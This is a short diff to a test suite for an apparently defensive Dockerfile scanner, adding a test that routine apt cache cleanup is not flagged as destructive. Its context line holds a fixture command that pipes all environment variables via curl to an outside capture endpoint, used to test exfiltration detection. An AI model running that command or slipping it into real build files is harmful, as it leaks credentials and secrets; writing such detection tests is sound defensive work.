@@ -25,6 +25,20 @@ RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
     assert "SKY-D327" in _rule_ids(findings)
 
 
+def test_dockerfile_apt_index_cleanup_is_not_destructive(tmp_path: Path):
+    dockerfile = tmp_path / "Dockerfile"
+    dockerfile.write_text(
+        "FROM python:3.12\n"
+        "RUN apt-get update; apt-get install -y curl; "
+        "rm -rf /var/lib/apt/lists/*\n",
+        encoding="utf-8",
+    )
+
+    findings = scan_dockerfiles(tmp_path)
+
+    assert "SKY-D329" not in _rule_ids(findings)
+
+
 def test_dockerfile_run_secret_env_upload_flags(tmp_path: Path):
     dockerfile = tmp_path / "Dockerfile"
     dockerfile.write_text(
